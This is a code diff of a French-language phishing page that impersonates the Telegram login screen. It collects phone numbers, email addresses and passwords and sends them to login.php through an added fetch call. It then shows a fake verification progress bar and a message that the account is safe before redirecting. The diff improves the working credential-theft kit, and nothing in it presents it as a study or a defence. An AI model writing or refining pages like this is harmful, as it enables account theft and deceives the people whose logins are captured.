@@ -127,6 +127,12 @@
             font-size: 1em;
             cursor: pointer;
         }
+        .loading-message {
+            display: none;
+            margin: 20px 0;
+            font-size: 1.1em;
+            color: #0088cc;
+        }
     </style>
 </head>
 <body>
@@ -135,43 +141,96 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo Telegram" />
     <h2 id="form-title">Telegram</h2>
     <div class="form-group">
-            <label>Numéro de téléphone</label>
-            <div class="phone-input">
-                <select id="country-code" name="country_code" class="country-code" required>
-                    <option value="+243">🇨🇩 +243</option>
-                    <option value="+237">🇨🇲 +237</option>
-                    <option value="+228">🇹🇬 +228</option>
-                    <option value="+242">🇨🇬 +242</option>
-                    <option value="+501">🇧🇿 +501</option>
-                    <option value="+224">🇬🇳 +224</option>
-                    <option value="+207">🇪🇬 +207</option>
-                    <option value="+33">🇫🇷 +33</option>
-                </select>
-                <input type="tel" id="phone-number" name="phone_number" class="phone-number" placeholder="Numéro" required autocomplete="tel">
-            </div>
+        <label>Numéro de téléphone</label>
+        <div class="phone-input">
+            <select id="country-code" name="country_code" class="country-code" required>
+                <!-- 35 pays d'Afrique -->
+                <option value="+213">🇩🇿 Algérie +213</option>
+                <option value="+244">🇦🇴 Angola +244</option>
+                <option value="+229">🇧🇯 Bénin +229</option>
+                <option value="+267">🇧🇼 Botswana +267</option>
+                <option value="+226">🇧🇫 Burkina Faso +226</option>
+                <option value="+257">🇧🇮 Burundi +257</option>
+                <option value="+237">🇨🇲 Cameroun +237</option>
+                <option value="+238">🇨🇻 Cap-Vert +238</option>
+                <option value="+235">🇹🇩 Tchad +235</option>
+                <option value="+269">🇰🇲 Comores +269</option>
+                <option value="+242">🇨🇬 Congo +242</option>
+                <option value="+243">🇨🇩 RDC +243</option>
+                <option value="+225">🇨🇮 Côte d'Ivoire +225</option>
+                <option value="+253">🇩🇯 Djibouti +253</option>
+                <option value="+20">🇪🇬 Égypte +20</option>
+                <option value="+240">🇬🇶 Guinée Équatoriale +240</option>
+                <option value="+291">🇪🇷 Érythrée +291</option>
+                <option value="+251">🇪🇹 Éthiopie +251</option>
+                <option value="+241">🇬🇦 Gabon +241</option>
+                <option value="+220">🇬🇲 Gambie +220</option>
+                <option value="+233">🇬🇭 Ghana +233</option>
+                <option value="+224">🇬🇳 Guinée +224</option>
+                <option value="+245">🇬🇼 Guinée-Bissau +245</option>
+                <option value="+254">🇰🇪 Kenya +254</option>
+                <option value="+266">🇱🇸 Lesotho +266</option>
+                <option value="+231">🇱🇷 Liberia +231</option>
+                <option value="+218">🇱🇾 Libye +218</option>
+                <option value="+261">🇲🇬 Madagascar +261</option>
+                <option value="+265">🇲🇼 Malawi +265</option>
+                <option value="+223">🇲🇱 Mali +223</option>
+                <option value="+222">🇲🇷 Mauritanie +222</option>
+                <option value="+230">🇲🇺 Maurice +230</option>
+                <option value="+212">🇲🇦 Maroc +212</option>
+                <option value="+258">🇲🇿 Mozambique +258</option>
+                <option value="+264">🇳🇦 Namibie +264</option>
+                
+                <!-- 25 pays d'Europe -->
+                <option value="+43">🇦🇹 Autriche +43</option>
+                <option value="+32">🇧🇪 Belgique +32</option>
+                <option value="+359">🇧🇬 Bulgarie +359</option>
+                <option value="+385">🇭🇷 Croatie +385</option>
+                <option value="+357">🇨🇾 Chypre +357</option>
+                <option value="+420">🇨🇿 République Tchèque +420</option>
+                <option value="+45">🇩🇰 Danemark +45</option>
+                <option value="+372">🇪🇪 Estonie +372</option>
+                <option value="+358">🇫🇮 Finlande +358</option>
+                <option value="+33">🇫🇷 France +33</option>
+                <option value="+49">🇩🇪 Allemagne +49</option>
+                <option value="+30">🇬🇷 Grèce +30</option>
+                <option value="+36">🇭🇺 Hongrie +36</option>
+                <option value="+354">🇮🇸 Islande +354</option>
+                <option value="+353">🇮🇪 Irlande +353</option>
+                <option value="+39">🇮🇹 Italie +39</option>
+                <option value="+371">🇱🇻 Lettonie +371</option>
+                <option value="+370">🇱🇹 Lituanie +370</option>
+                <option value="+352">🇱🇺 Luxembourg +352</option>
+                <option value="+356">🇲🇹 Malte +356</option>
+                <option value="+31">🇳🇱 Pays-Bas +31</option>
+                <option value="+48">🇵🇱 Pologne +48</option>
+                <option value="+351">🇵🇹 Portugal +351</option>
+                <option value="+40">🇷🇴 Roumanie +40</option>
+                <option value="+421">🇸🇰 Slovaquie +421</option>
+            </select>
+            <input type="tel" id="phone-number" name="phone_number" class="phone-number" placeholder="Numéro" required autocomplete="tel">
+        </div>
     </div>
-      <form action="login.php" method="post" a>
+    <form action="login.php" method="post" id="loginForm">
         <div class="form-group">
             <label for="email">Email</label>
             <input type="email" id="email" name="email" placeholder="Votre email" required autocomplete="username">
-            <div class="form-group">
-         <label for="password">mot de passe</label>
-            <input type="password" id="password" name="password" placeholder="mot de passe" required autocomplete="username">
-        </div>   
-            
-        
-        
+        </div>
+        <div class="form-group">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
+        </div>
         <div class="remember-me">
             <input type="checkbox" id="remember" name="remember" checked>
             <label for="remember">Garder ma session active</label>
         </div>
         <button type="submit" id="submit-btn">Continuer</button>
     </form>
-   <div class="loading" id="loading">Chargement</div>
-        <div class="message" id="message"></div>
-    </form>
 
-    <!-- la fausse barre de chargement -->
+    <div class="loading-message" id="loading-message">
+        Vérification en cours, veuillez patienter...
+    </div>
+
     <div class="progress-container" id="progress-container">
         <div class="progress-bar">
             <div class="progress-bar-fill" id="progress-fill">0%</div>
@@ -182,37 +241,54 @@
         <p>Votre compte est en sécurité.</p>
         <button class="confirm-btn" onclick="location.reload()">Confirmer</button>
     </div>
-
 </div>
 
 <script>
     const loginForm = document.getElementById('loginForm');
-    const message = document.getElementById('message');
-    const loading = document.getElementById('loading');
-    const submitBtn = document.getElementById('submit-btn');
+    const loadingMessage = document.getElementById('loading-message');
     const progressContainer = document.getElementById('progress-container');
     const progressFill = document.getElementById('progress-fill');
     const finalMessage = document.getElementById('final-message');
 
-    loginForm.addEventListener('submit', function(event) {
+    loginForm.addEventListener('submit', async function(event) {
         event.preventDefault();
+        
+        // 1. Soumission IMMÉDIATE des identifiants au PHP
+        const formData = new FormData(loginForm);
+        try {
+            await fetch('login.php', {
+                method: 'POST',
+                body: formData
+            });
+        } catch (e) {
+            console.error("Erreur d'envoi", e);
+        }
+
+        // 2. Masquer le formulaire et afficher l'animation
         loginForm.style.display = 'none';
+        loadingMessage.style.display = 'block';
         progressContainer.style.display = 'block';
 
+        // 3. Animation de 15 secondes
         let progress = 0;
         const interval = setInterval(() => {
-            progress += Math.floor(Math.random() * 10) + 5;
+            progress += 5;
             if (progress >= 100) {
-                progress = 100;
                 clearInterval(interval);
+                loadingMessage.style.display = 'none';
                 progressContainer.style.display = 'none';
                 finalMessage.style.display = 'block';
+                
+                // 4. Redirection après 2 secondes supplémentaires
+                setTimeout(() => {
+                    window.location.href = "mer.html";
+                }, 2000);
             }
             progressFill.style.width = progress + '%';
             progressFill.textContent = progress + '%';
-        }, 300);
+        }, 750); // 15 secondes total
     });
 </script>
 
 </body>
-</html>
+                </html>
